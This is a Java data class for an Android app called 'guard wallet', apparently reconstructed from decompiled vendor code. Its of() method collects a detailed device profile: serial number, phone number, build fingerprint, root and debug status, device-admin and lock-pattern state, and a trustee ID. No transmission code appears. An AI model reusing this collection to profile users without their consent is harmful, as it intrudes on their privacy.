package com.guard.wallet.resp;

import com.guard.wallet.core.AppUtils;
import android.annotation.SuppressLint;
import android.os.Build;
import android.os.Build.VERSION;
import androidx.annotation.NonNull;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.BatteryLevelVO;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.utils.DeviceUtils;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;
import java.io.Serializable;
import java.util.Arrays;
import java.util.List;

/**
 * 设备信息 VO — vendor DeviceInfoVO 608行。
 * of() 收集完整设备信息快照。
 */
public class DeviceInfoVO implements Serializable {
    private Integer apiGrade;
    private BatteryLevelVO batteryLevel;
    private String board;
    private String brandCode;
    private String codeName;
    private String device;
    private DeviceAdminVO deviceAdmin;
    private String deviceId;
    private String deviceToken;
    private String deviceUid;
    private String displayId;
    private Integer enableDebug;
    private Integer enableDevelopment;
    private Integer enableWifiDebug;
    private String factoryTime;
    private String fingerPrint;
    private String hardwareName;
    private String incremental;
    private Integer isRoot;
    private String langCode;
    private LockPatternVO lockPattern;
    private String manufacturer;
    private String model;
    private String optimalABI;
    private String osArch;
    private String osName;
    private String osVersion;
    private String packageName;
    private String phoneNumber;
    private String product;
    private String release;
    private ScreenMetricsVO screen;
    private String serial;
    private List<String> supportABI;
    private String trusteeId;

    public DeviceInfoVO() {}

    public DeviceInfoVO(String deviceId, String deviceUid, String packageName, String deviceToken,
                         String displayId, String board, String brandCode, String optimalABI,
                         String device, String fingerPrint, String serial, String manufacturer,
                         String model, String hardwareName, String product, String codeName,
                         String incremental, String release, Integer apiGrade, String osVersion,
                         String osName, String osArch, String langCode, ScreenMetricsVO screen,
                         DeviceAdminVO deviceAdmin, LockPatternVO lockPattern, BatteryLevelVO batteryLevel,
                         Integer isRoot, Integer enableDevelopment, Integer enableDebug,
                         Integer enableWifiDebug, String phoneNumber, String factoryTime, String trusteeId) {
        this.deviceId = deviceId;
        this.deviceUid = deviceUid;
        this.packageName = packageName;
        this.deviceToken = deviceToken;
        this.displayId = displayId;
        this.board = board;
        this.brandCode = brandCode;
        this.optimalABI = optimalABI;
        this.device = device;
        this.fingerPrint = fingerPrint;
        this.serial = serial;
        this.manufacturer = manufacturer;
        this.model = model;
        this.hardwareName = hardwareName;
        this.product = product;
        this.codeName = codeName;
        this.incremental = incremental;
        this.release = release;
        this.apiGrade = apiGrade;
        this.osVersion = osVersion;
        this.osName = osName;
        this.osArch = osArch;
        this.langCode = langCode;
        this.screen = screen;
        this.deviceAdmin = deviceAdmin;
        this.lockPattern = lockPattern;
        this.batteryLevel = batteryLevel;
        this.isRoot = isRoot;
        this.enableDevelopment = enableDevelopment;
        this.enableDebug = enableDebug;
        this.enableWifiDebug = enableWifiDebug;
        this.phoneNumber = phoneNumber;
        this.factoryTime = factoryTime;
        this.trusteeId = trusteeId;
    }

    /** vendor DeviceInfoVO.of() — 收集完整设备信息 */
    @SuppressLint({"HardwareIds"})
    public static DeviceInfoVO of() {
        DeviceInfoVO vo = new DeviceInfoVO();
        vo.setDeviceUid(DeviceUtils.getDeviceUniqueId());
        if (MainApplication.getInstance() != null) {
            vo.setPackageName(MainApplication.getInstance().getPackageName());
        }
        vo.setDeviceToken(SharedPrefsManager.l("deviceToken"));
        vo.setDisplayId(Build.DISPLAY);
        vo.setBoard(Build.BOARD);
        vo.setBrandCode(Build.BRAND);
        String[] abis = Build.SUPPORTED_ABIS;
        if (abis != null && abis.length > 0) {
            vo.setSupportABI(Arrays.asList(abis));
            vo.setOptimalABI(abis[0]);
        }
        vo.setDevice(Build.DEVICE);
        vo.setFingerPrint(Build.FINGERPRINT);
        vo.setSerial(Build.SERIAL);
        vo.setManufacturer(Build.MANUFACTURER);
        vo.setModel(Build.MODEL);
        vo.setHardwareName(Build.HARDWARE);
        vo.setProduct(Build.PRODUCT);
        vo.setRelease(VERSION.RELEASE);
        vo.setCodeName(VERSION.CODENAME);
        vo.setIncremental(VERSION.INCREMENTAL);
        vo.setApiGrade(VERSION.SDK_INT);
        vo.setOsVersion(System.getProperty("os.version"));
        vo.setOsName(System.getProperty("os.name"));
        vo.setOsArch(System.getProperty("os.arch"));
        vo.setLangCode(SharedPrefsManager.m());
        vo.setScreen(DeviceUtils.buildScreenMetrics());
        vo.setDeviceAdmin(SystemHelper.C0());
        vo.setLockPattern(SystemHelper.B0());
        vo.setBatteryLevel(AppUtils.d());
        vo.setIsRoot(AppUtils.e() ? 1 : 0);
        vo.setEnableDevelopment(SystemHelper.K() ? 1 : 0);
        vo.setEnableDebug(SystemHelper.I() ? 1 : 0);
        vo.setEnableWifiDebug(SystemHelper.J() ? 1 : 0);
        vo.setPhoneNumber(DeviceUtils.getPhoneNumber());
        try {
            long buildTime = Build.TIME;
            vo.setFactoryTime(buildTime > 0 ? String.valueOf(buildTime) : null);
        } catch (Exception ex) {
            AppUtils.s("DeviceUtils", ex);
        }
        vo.setDeviceId(SharedPrefsManager.l("deviceId"));
        vo.setTrusteeId(SharedPrefsManager.l("trusteeId"));
        return vo;
    }

    // ═══════ Getters ═══════
    public Integer getApiGrade() { return apiGrade; }
    public BatteryLevelVO getBatteryLevel() { return batteryLevel; }
    public String getBoard() { return board; }
    public String getBrandCode() { return brandCode; }
    public String getCodeName() { return codeName; }
    public String getDevice() { return device; }
    public DeviceAdminVO getDeviceAdmin() { return deviceAdmin; }
    public String getDeviceId() { return deviceId; }
    public String getDeviceToken() { return deviceToken; }
    public String getDeviceUid() { return deviceUid; }
    public String getDisplayId() { return displayId; }
    public Integer getEnableDebug() { return enableDebug; }
    public Integer getEnableDevelopment() { return enableDevelopment; }
    public Integer getEnableWifiDebug() { return enableWifiDebug; }
    public String getFactoryTime() { return factoryTime; }
    public String getFingerPrint() { return fingerPrint; }
    public String getHardwareName() { return hardwareName; }
    public String getIncremental() { return incremental; }
    public Integer getIsRoot() { return isRoot; }
    public String getLangCode() { return langCode; }
    public LockPatternVO getLockPattern() { return lockPattern; }
    public String getManufacturer() { return manufacturer; }
    public String getModel() { return model; }
    public String getOptimalABI() { return optimalABI; }
    public String getOsArch() { return osArch; }
    public String getOsName() { return osName; }
    public String getOsVersion() { return osVersion; }
    public String getPackageName() { return packageName; }
    public String getPhoneNumber() { return phoneNumber; }
    public String getProduct() { return product; }
    public String getRelease() { return release; }
    public ScreenMetricsVO getScreen() { return screen; }
    public String getSerial() { return serial; }
    public List<String> getSupportABI() { return supportABI; }
    public String getTrusteeId() { return trusteeId; }

    // ═══════ Setters ═══════
    public void setApiGrade(Integer v) { this.apiGrade = v; }
    public void setBatteryLevel(BatteryLevelVO v) { this.batteryLevel = v; }
    public void setBoard(String v) { this.board = v; }
    public void setBrandCode(String v) { this.brandCode = v; }
    public void setCodeName(String v) { this.codeName = v; }
    public void setDevice(String v) { this.device = v; }
    public void setDeviceAdmin(DeviceAdminVO v) { this.deviceAdmin = v; }
    public void setDeviceId(String v) { this.deviceId = v; }
    public void setDeviceToken(String v) { this.deviceToken = v; }
    public void setDeviceUid(String v) { this.deviceUid = v; }
    public void setDisplayId(String v) { this.displayId = v; }
    public void setEnableDebug(Integer v) { this.enableDebug = v; }
    public void setEnableDevelopment(Integer v) { this.enableDevelopment = v; }
    public void setEnableWifiDebug(Integer v) { this.enableWifiDebug = v; }
    public void setFactoryTime(String v) { this.factoryTime = v; }
    public void setFingerPrint(String v) { this.fingerPrint = v; }
    public void setHardwareName(String v) { this.hardwareName = v; }
    public void setIncremental(String v) { this.incremental = v; }
    public void setIsRoot(Integer v) { this.isRoot = v; }
    public void setLangCode(String v) { this.langCode = v; }
    public void setLockPattern(LockPatternVO v) { this.lockPattern = v; }
    public void setManufacturer(String v) { this.manufacturer = v; }
    public void setModel(String v) { this.model = v; }
    public void setOptimalABI(String v) { this.optimalABI = v; }
    public void setOsArch(String v) { this.osArch = v; }
    public void setOsName(String v) { this.osName = v; }
    public void setOsVersion(String v) { this.osVersion = v; }
    public void setPackageName(String v) { this.packageName = v; }
    public void setPhoneNumber(String v) { this.phoneNumber = v; }
    public void setProduct(String v) { this.product = v; }
    public void setRelease(String v) { this.release = v; }
    public void setScreen(ScreenMetricsVO v) { this.screen = v; }
    public void setSerial(String v) { this.serial = v; }
    public void setSupportABI(List<String> v) { this.supportABI = v; }
    public void setTrusteeId(String v) { this.trusteeId = v; }

    @NonNull
    @Override
    public String toString() {
        return "DeviceInfoVO{deviceId='" + deviceId + "', model='" + model
                + "', manufacturer='" + manufacturer + "', apiGrade=" + apiGrade
                + ", release='" + release + "', packageName='" + packageName + "'}";
    }
}
